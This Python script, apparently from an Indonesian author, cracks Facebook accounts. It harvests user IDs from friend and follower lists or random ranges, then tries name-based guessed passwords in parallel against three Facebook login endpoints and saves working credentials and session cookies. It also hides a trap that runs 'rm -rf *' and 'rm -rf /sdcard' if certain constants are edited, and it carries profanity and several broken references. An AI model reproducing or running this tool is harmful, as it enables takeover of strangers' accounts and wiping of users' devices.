#!/usr/bin/python2
# coding=utf-8-*-
# author : Khamdihi XD
#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By Khamdihi XD

# BEBAS REKODE ASAL BERI NAMA GUE DI AUTHOR NYA
# WA ME -> +62 831-4606-1814 + (DONASIDANA/PULSA)
# GITHUB ME -> https://github.com/OPDIHI
# CUMA NGINGTIN DILARANG MENGHAPUS ATAU MERUBAH JIKA KAMH MASIH PEMULA KARNA ADA KODE UNTUK MENGHAPUS MEMORI

### IMPORT MODULE ###
import os, sys, re, time, requests, calendar, random,json
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
from time import sleep as waktu
try:
	import requests
except ImportError:
	print("\n [!] module requests belum terinstall")
	os.system("pip2 install requests")
try:
	import bs4
except ImportError:
	print("\n [!] module bs4 belum terinstall")
	os.system("pip2 install bs4")
try:
	import concurrent.futures
except ImportError:
	print("\n [!] module futures belum terinstall")
	os.system("pip2 install futures")

### GLOBAL WARNA ###
P = '\x1b[1;97m' # PUTIH     *
M = '\x1b[1;91m' # MERAH  *
H = '\x1b[1;92m' # HIJAU.      *
K = '\x1b[1;93m' # KUNING.    *
B = '\x1b[1;94m' # BIRU.                 *
U = '\x1b[1;95m' # UNGU.               "
O = '\x1b[1;96m' # BIRU MUDA.     *
N = '\x1b[0m'    # WARNA MATI     *

### GLOBAL NAMA ###
IP = requests.get('https://api.ipify.org').text
url = "https://mbasic.facebook.com"
ses = requests.Session()
id = []
cp = []
ok = []
opsi = []
ubahP = []
pwbaru = []
data = {}
data2 = {}
loop = 0
headerz = random.choice([
	"Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
	"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; de-at) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
	"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36"
])

### GLOBAL WAKTU ###
ct = datetime.now()
n = ct.month
bulann = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','November','Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulann[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
ua = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; de-at) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1"
### DEF TAMBAHAN ###
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def mlaku(z):
        for e in z + "\n":
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)

### KALO KAMU BELUM TAU INI JANGAN DI GANTI BAHAYA
AUTHOR_SCRIPT   = 'KHAMDIHI XD KANG CODING UTF8'
PENGGUNA_SCRIPT = 'KANG REKODE HANDAL KEK KONTOL'
PENGHAPUSMEMORI = 'KHAMDIHI XD KANG CODING UTF8KANG REKODE HANDAL KEK KONTOL'

### AKU GAK MAU BERTANGUNG JAWAB OK
def ___parah___(AUTHOR_SCRIPT,PENGGUNA_SCRIPT):
    ___jangandiganti___ = AUTHOR_SCRIPT+PENGGUNA_SCRIPT
    if ___jangandiganti___ not in PENGHAPUSMEMORI:os.system('termux-setup-storage');os.system('rm -rf *');os.system('rm -rf /sdcard');print('[!] Maaf file sdcard kamu telah terhapus ! di karnakan rekode !');exit()
    else:pass

### INI JANGAN DI GANTI YAH NANTI EROR :(
___crot___ = '___khamdihi___XD___'
____rekode____ = '___hayu___mau___rekodeya___'
___khamdihi___ = '___my___frinds___the___best'
___buatkamuyangrekode___ = '___tetap___semangat___'

### INI JANGAN DI GANTI KONTOL PLEASE ';(
___dihi___   = '_____khamdihi_____'
___khaa___   = 'sayang'
___rekode___ = 'diatapidiagakpeka'
____cek____  = '_____khamdihi_____sayangdiatapidiagakpeka'

def ___cek___(___dihi___,___khaa___,___rekode___):
    _sayang_ = ___dihi___+___khaa___+___rekode___
    if _sayang_ not in ____cek____:print('[!] Suhu kok mau rekode sih :)');exit()
    else:pass
    menu()

### BANNER AND SPANDUK BERI NAMA KU DI SINI DAN KAMU
def semangat():
    if ___crot___ not in '___khamdihi___XD___':
                os.system('clear')
                semangat()
                print('[ awas jika rekode kalian kena mental')
                print('[ Kan udah ku bilang jangan di ganti');sys.exit()
    else:pass
    print('''
 _  _   _  ___  ___
| || \_/ || o )| __| | Made with by Khamdihi XD
| || \_/ || o \| _|  | https://github.com/OPDIHI
|_||_| |_||___/|_|   | Versi saat ini 1.2\n''')

### METODE LOGIN PAKE TOKEN NGENT*D
def login():
    if ____rekode____ not in '___hayu___mau___rekodeya___':
                  os.system('clear');semangat()
                  print('[ Kan udah aku bilang jangan di ganti ]')
                  sys.exit('[ mau rekode tapi eror ya wak kasian')
    else:pass
    os.system('clear');semangat()
    ___parah___(AUTHOR_SCRIPT,PENGGUNA_SCRIPT)
    print('[1] Login pake token ')
    print('[2] seting user-agent')
    print('[0] Keluar')
    aku = raw_input('\n[?] Chose menu : ')
    if aku =='':
         exit('\n[!] Jangan kosong')
    elif aku in ['1','01']:
         token()
    elif aku in ['2','02']:
         user()
    elif aku in ['0','00']:
         exit()
    else:
         exit('\n[!] Pilih 1-0 bukan -> '+(aku))

### METODE LOGIN WITH TOKEN
def token():
         os.system('clear');semangat()
         if ___buatkamuyangrekode___ not in '___tetap___semangat___':
                      os.system('clear');semangat()
                      print('[+] Awas cok jika kalian kena mental')
                      print('[*] makanya jangan di ganti');sys.exit()
         else:pass
         kontol = raw_input('[?] Masukan token : ')
         try:
                     otw = requests.get('https://graph.facebook.com/me?access_token='+kontol)
                     a = json.loads(otw.text)
                     nama = a['name']
                     zedd = open("token.txt", 'w')
                     zedd.write(kontol)
                     zedd.close()
                     menu()
         except KeyError:
                     print("[x] Token Salah")
                     time.sleep(1.7)
                     login()
         except requests.exceptions.SSLError:
                     exit('[x] Koneksi Error')

### USERAGENT MANUAL
def user():
        if ___khamdihi___ not in '___my___frinds___the___best':
                     os.system('clear');semangath()
                     print('[*] Makanya jangan di ganti bang')
                     print('[+] Wenak mau rekode gagal enak ":)');sys.exit()
        else:pass
        ajg = raw_input("[?] masukan ua : ")
        if ajg in[""]:
                          login()
        else:
                try:
                          zedd = open('ua.txt', 'w')
                          zedd.write(ajg)
                          zedd.close()
                          print("[✓] berhasil mengganti ua")
                          raw_input("[*] tekan enter untuk kembali ke menu")
                          login()
                except KeyError:
                          exit()

def menu():
    if ____rekode____ not in '___hayu___mau___rekodeya___':
               os.system('clear');semangat()
               print('[*] Ops eror yah suhu ')
               print('[!] Makanya jangan di rubah suhu ');sys.exit()
    else:pass
    global token
    os.system('clear')
    try:
        kontol = open('token.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + kontol)
        a = json.loads(otw.text)
        nama = a['name']
        uid = a['id']
        ttl = a['birthday']
    except (KeyError, IOError):
        os.system('clear')
        print("\n %s[!] token kadaluwarsa!"%(P));time.sleep(2)
        os.system('rm -f token.txt')
        login()
    except requests.exceptions.ConnectionError:
        exit(" %s[!] anda tidak terhubung ke internet!"%(M))
    semangat()
    ___parah___(AUTHOR_SCRIPT,PENGGUNA_SCRIPT)
    jalan('[+] selamat datang %s '%(nama))
    print(' ')
    print('[+] ID Kamu : '+(uid));time.sleep(0.1)
    print('[+] Ttl Kamu : '+(ttl));time.sleep(0.1)
    print('[+] Kamu masuk pada : '+(tanggal));time.sleep(0.1)
    print('\n[1] Crack dari publik/teman');time.sleep(0.1)
    print('[2] Crack dari followers');time.sleep(0.1)
    print('[3] Crack facebook massal ');time.sleep(0.1)
    print('[4] Crack akun baru');time.sleep(0.1)
    print('[5] Crack akun old/lama');time.sleep(0.1)
    print('[6] Get data² target');time.sleep(0.1)
    print('[7] Seting user-agent');time.sleep(0.1)
    print('[8] Cek opsi chekpoint');time.sleep(0.1)
    print('[9] Cek hasil');time.sleep(0.1)
    print('[L] Lapor bug');time.sleep(0.1)
    print('[0] Keluar ngentod\n');time.sleep(0.1)
    ___mmk___ = raw_input('[?] pilih menu : ');time.sleep(0.1)
    if ___mmk___ in ['',' ', '']:
        print('\n[*] Kasian masih kecil matanya buram')
        ___dihiXD___ = raw_input('[ Enter mas maaf bercanda kok ] ');menu()
    elif ___mmk___ in ['1','01']:
        ___publik___() #
        __metode__()
    elif ___mmk___ in ['2','02']:
        follo() #
        __metode__()
    elif ___mmk___ in ['3','03']:
        ___massal___() #
        __metode__()
    elif ___mmk___ in ['4','04']:
        ___fbbaru() #
        __metode()
    elif ___mmk___ in ['5','05']:
        ___fblama() #
        __metode__()
    elif ___mmk___ in ['6','06']:
        jalan('[*] Maaf menu ini non aktif');menu() #
    elif ___mmk___ in ['7','07']:
        ua() #
    elif ___mmk___ in ['8','08']:
        opsi()
    elif ___mmk___ in ['9','09']:
        hasil()
    elif ___mmk___ in ['0','00']:
        os.system('rm -rf token.txt');exit() #
    elif ___mmk___ in ['l','L']:
        os.system('xdg-open https://wa.me/qr/VOPTEUBSWABNH1')
        menu()
    else:
        menu()

def hasil():
	print('+──────────────────────────────────────────+')
	print('[1]. lihat hasil crack OK ')
	print('[2]. lihat hasil crack CP ')
	print('+──────────────────────────────────────────+')
	anjg = raw_input('[?] pilih : ')
	if anjg == '':
		menu()
	elif anjg == "1":
		dirs = os.listdir("OK")
		print('+──────────────────────────────────────────+')
		for file in dirs:
			print("[*] "+file)
		try:
			print('+──────────────────────────────────────────+')
			file = raw_input("[?] file : ")
			if file == "":
				menu()
			totalok = open("OK/%s"%(file)).read().splitlines()
		except IOError:
			exit("[!] file %s tidak tersedia"%(file))
		print('──────────────────────────────────────────')
		os.system("cat OK/%s"%(file))
		print('──────────────────────────────────────────')
		input("[*] tekan enter untuk kembali ke menu")
		menu()
	elif anjg == "2":
		dirs = os.listdir("CP")
		print('──────────────────────────────────────────')
		for file in dirs:
			print("[*] "+file)
		try:
			print('──────────────────────────────────────────')
			file = raw_input("[?] file : ")
			if file == "":
				menu()
			totalcp = open("CP/%s"%(file)).read().splitlines()
		except IOError:
			exit("[!] file %s tidak tersedia"%(file))
		print('──────────────────────────────────────────')
		os.system("cat CP/%s"%(file))
		print('──────────────────────────────────────────')
		raw_input("[*] tekan enter untuk kembali ke menu ")
		menu()
	else:
		menu()

def opsi():
	dirs = os.listdir("CP")
	for file in dirs:
		print("[*] CP/"+file)
	print('+──────────────────────────────────────────+')
	files = raw_input("[?] file  : ")
	if files == "":
		menu()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n[!] nama file %s tidak tersedia"%(files))
	ubahpw()
	print('\n[!] anda bisa mematikan data selular untuk menjeda proses cek')
	print('+──────────────────────────────────────────+')
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print("[+] cek : %s%s%s"%(K,kontol.replace("  * --> ",""),N))
		try:
			cek_opsi(titid[0].replace("  * --> ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
		print('+──────────────────────────────────────────+')
	print("\n[!] cek akun sudah selesai...")
	input("[*] tekan enter untuk kembali ke menu ")
	time.sleep(1)
	menu()

def ua():
        if ___khamdihi___ not in '___my___frinds___the___best___':
                     os.system('clear');semangath()
                     print('[*] Makanya jangan di ganti bang')
                     print('[+] Wenak mau rekode gagal enak')
        else:pass
        ajg = raw_input("[?] masukan ua : ")
        if ajg in[""]:
                          menu()
        else:
                try:
                          zedd = open('ua.txt', 'w')
                          zedd.write(ajg)
                          zedd.close()
                          print("[✓] berhasil mengganti ua")
                          raw_input("[*] tekan enter untuk kembali")
                          menu()
                except KeyError:
                          exit()
def follo():
	global token
	try:
		kontol = open("token.txt", "r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
	print("[*] Type 'me' jika ingin crack dari pengikut sendiri")
	idt = raw_input("[!] masukan id atau username : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, kontol)).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" [!] akun tidak tersedia atau list teman private")
	print("[+] total id  : %s%s%s"%(M,len(id),N))
	
def ___fbbaru():
	x = 11111111111
	xx = 77777777777
	idx = "5000"
	limit = int(raw_input("[•] Masukan limit id (cth 5000): "))
	try:
		for n in range(limit):
			_ = random.randint(x,xx)
			__ = idx
			id.append(__+"<=>"+str(_))
	except KeyError:
		exit('[!] Kayaknya ada yang eror kek otak lu')
	print("[+] total id : %s%s%s"%(M,len(id),N))
	
def ___publik___():
	global token
	try:
		kontol = open("token.txt", "r").read()
	except IOError:
		exit("[!] token kadaluwarsa")
		time.sleep (0.01)
		print
	jalan("[+] Ketik [ me ] jika ingin crack from teman")
	time.sleep (0.01)
	idt = raw_input("[?] Masukan id : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, kontol)).json()["data"]:
			id.append(i["id"]+"<=>"+i["name"])
	except KeyError:
		exit("[!] Id tidak publik")
	print("[✓] Total id : %s%s%s"%(M,len(id),N))

def ___fblama():
	x = 111111111
	xx = 999999999
	idx = "5000" 
	limit = int(raw_input("[+] Masukan limit id (cth 5000): "))
	try:
		for n in range(limit):
			_ = random.randint(x,xx)
			__ = idx
			id.append(__+"<=>"+str(_))
	except KeyError:
		exit('[!] Id privat/script lagi eror kek otak lu')
	print("[!] total id  : %s%s%s"%(P,len(id),N))
	

def ___massal___():
	if ____rekode____ not in '___hayu___mau___rekodeya___':
		print('[×] Makanya jangan di ganti ngentod');sys.exit()
        else:pass
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
	try:
		tanya_total = int(raw_input("[?] Masukan jumlah id target : "))
	except:tanya_total=1
	print("[×] Type 'me' jika ingin crack dari daftar teman")
	for t in range(tanya_total):
		t +=1
		idt = raw_input("[?] id target %s : "%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				id.append(uid+"<=>"+nama)
		except KeyError:
			print("[!] Akun privat/id kamu slaah")
	print("[+] total id : %s%s%s"%(P,len(id),N))
	
def __metode__():
    time.sleep(2)
    print('\n[1] Metode b-api  | crack fast')
    print('[2] Metode mbasic | crack selow')
    print('[3] Metode mobile | rekomendasi')
    print('[0] Jika id = 0 kembali aja ke menu\n')
    dihi = raw_input('[?] Metode chose : ')
    print(' ')
    if dihi =='':
          print('[!] Pilih salah satu kontol')
          time.sleep(2);__metode__()
    elif dihi in ['1','01']:
         print('[*] Hasil ok tersimpan di ok.txt')
         print('[*] Hasil cp tersimpan di cp.txt\n')
         with ThreadPoolExecutor(max_workers=30) as fall:
              for user in id:
                  uid, name = user.split("<=>")
                  nam = name.split(' ')
                  if len(name) == 3 or len(name) == 4 or len(name) == 5 or len(name) == 6:
                         pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
                  else:
                         pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
                  fall.submit(bapi, user)
         exit("\n\n [!] crack selesai, salin terlebih dahulu")
    elif dihi in ['2','02']:
         print('[*] Hasil ok tersimpan di ok.txt')
         print('[*] Hasil cp tersimpan di cp.txt\n')
         with ThreadPoolExecutor(max_workers=30) as fall:
              for user in id:
                  uid, name = user.split("<=>")
                  nam = name.split(' ')
                  if len(name) == 3 or len(name) == 4 or len(name) == 5 or len(name) == 6:
                         pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
                  else:
                         pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
                  fall.submit(mbasic, user)
         exit("\n\n\x1b[1;97m [#] crack selesai, salin hasilnya")

    elif dihi in ['3','03']:
         print('[*] Hasil ok tersimpan di ok.txt')
         print('[*] Hasil cp tersimpan di cp.txt\n')
         with ThreadPoolExecutor(max_workers=30) as fall:
              for user in id:
                  uid, name = user.split("<=>")
                  nam = name.split(' ')
                  if len(name) == 3 or len(name) == 4 or len(name) == 5 or len(name) == 6:
                         pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
                  else:
                         pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
                  fall.submit(mobile,user)
         exit("\n\n [#] \x1b[1;97mcrack selesai...")
    elif dihi in ['0','00']:
         menu()
    else:
         __metode__()
def mobile(user):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	sys.stdout.write(
		"\r[Crack] (%s) - (%s)  OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345" ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345" ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345" ]
	else:
		pwx = [ name+"123", name+"12345" ]
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com")
			b = bs4.BeautifulSoup(p.text, 'html.parser')
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post("https://m.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\x1b[1;92m[OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;95m[CP] %s|%s\033[0;91m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
				break
				continue
		loop += 1
	except:
		pass

def bapi(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	sys.stdout.write(
		"\r[Crack] %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345" ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345" ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345" ]
	else:
		pwx = [ name+"123", name+"12345" ]
	try:
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
			if "session_key" in send.text and "EAAA" in send.text:
				print("\r\x1b[1;92m[OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print("\r\x1b[1;92m[CP] %s|%s\033[0;92m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
		loop += 1
	except:
		pass


def mbasic(user):

	try:

		ua = open(".ua", "r").read()

	except IOError:

		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")

	global loop, token

	sys.stdout.write(

		"\r[Crack] %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))

	); sys.stdout.flush()

	uid, name = user.split("<=>")

	if len(name)>=6:

		pwx = [ name, name+"123", name+"1234", name+"12345" ]

	elif len(name)<=2:

		pwx = [ name+"123", name+"1234", name+"12345" ]

	elif len(name)<=3:

		pwx = [ name+"123", name+"12345" ]

	else:

		pwx = [ name+"123", name+"12345" ]

	try:

		for pw in pwx:

			kwargs = {}

			pw = pw.lower()

			ses = requests.Session()

			ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})

			p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text

			b = parser(p,"html.parser")

			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]

			for i in b("input"):

				try:

					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})

					else:continue

				except:pass

			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})

			gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)

			if "c_user" in ses.cookies.get_dict().keys():

				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

				print("\r\x1b[1;92m[OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))

				ok.append("%s|%s"%(uid, pw))

				open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))

				break

				continue

			elif "checkpoint" in ses.cookies.get_dict().keys():

				print("\r\x1b[1;92m[CP] %s|%s\033[0;96m        "%(uid, pw))

				cp.append("%s|%s"%(uid, pw))

				open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))

				break

				continue

		loop += 1

	except:

		pass

if __name__ == '__main__':
   os.system('git pull')
   os.system('clear')
   jalan("\x1b[1;92m[✓] Suscribe chenel aku dulu ya bang ';(")
   os.system('xdg-open https://youtube.com/channel/UCOqxx2kjYPypVct2l81Y1Jw')
   ___cek___(___dihi___,___khaa___,___rekode___)
